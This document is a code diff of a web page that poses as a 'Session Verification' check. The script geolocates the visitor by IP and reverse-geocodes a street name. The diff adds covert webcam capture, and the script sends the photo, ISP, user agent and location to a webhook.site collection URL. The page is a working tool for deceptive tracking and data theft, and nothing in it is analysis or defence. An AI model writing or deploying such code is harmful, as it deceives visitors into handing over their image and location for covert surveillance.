@@ -4,10 +4,11 @@
   <title>Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
 </head>
-
 <body style="font-family:Arial;text-align:center;margin-top:50px;">
   <h3>Session Verification</h3>
-  <p>Verifying device and region...</p>
+  <p>Verifying device, region, and capturing photo...</p>
+  <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
   <script>
     async function verify() {
@@ -15,17 +16,33 @@
         // Step 1: Get IP info
         const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
 
-        // Step 2: Reverse geocode using CORS proxy
-        const proxyUrl = "https://api.allorigins.win/get?url=";
-        const targetUrl = encodeURIComponent(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}`);
+        // Step 2: Reverse geocode using OpenCage API (free tier)
+        const opencageKey = "YOUR_OPENCAGE_KEY"; // Replace with your key
+        const geoData = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${ipData.latitude}+${ipData.longitude}&key=${opencageKey}`)
+          .then(res => res.json());
         
-        const geoData = await fetch(proxyUrl + targetUrl)
-          .then(res => res.json())
-          .then(res => JSON.parse(res.contents));
+        const street = geoData.results[0]?.components.road || "N/A";
 
-        const street = geoData.address.road || "N/A"; // street name if available
+        // Step 3: Capture webcam photo
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
 
-        // Step 3: Send data to webhook
+        // Ask for webcam permission
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.style.display = "block";
+
+        // Wait a moment to capture
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
+        // Draw video frame to canvas
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        const photoData = canvas.toDataURL("image/png"); // base64 image
+
+        // Stop webcam
+        stream.getTracks().forEach(track => track.stop());
+
+        // Step 4: Send data to webhook
         await fetch("https://webhook.site/a55ffe99-f30b-44b2-80c6-3f31ae2fa387", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -40,7 +57,8 @@
             isp: ipData.org,
             asn: ipData.asn,
             userAgent: navigator.userAgent,
-            time: new Date().toISOString()
+            time: new Date().toISOString(),
+            photo: photoData
           })
         });
 
